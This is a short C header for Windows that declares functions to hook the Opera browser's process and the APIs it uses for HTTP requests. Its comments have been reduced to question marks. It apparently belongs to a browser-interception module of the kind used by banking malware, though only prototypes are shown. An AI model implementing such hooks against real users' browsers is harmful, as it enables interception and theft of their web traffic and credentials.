#ifndef		OperaH
#define		OperaH
//----------------------------------------------------------------------------

#include <windows.h>


//*********************************************************************
//  HookOpera - ??????? ?????? ???? ?? Opera.exe 
//  ??????? ????????? ? ????? ???????? ??? ????????, ??????? ?????? 
//  ????, ???? ?? ?????? api
//*********************************************************************
bool HookOpera();

//*********************************************************************
//  HookOperaApi - ??????? ?????? ???? ?? API,
//  ??????? ?????????? Opera ??? ???????? http-????
//*********************************************************************
bool HookOperaApi(DWORD HookRVA);

//*********************************************************************
//  IsOpera ??????? ?????????? ?????? ???? ?????? ??????
//  ???????? ????????? Opera
//*********************************************************************
bool WINAPI IsOpera();

//----------------------------------------------------------------------------
#endif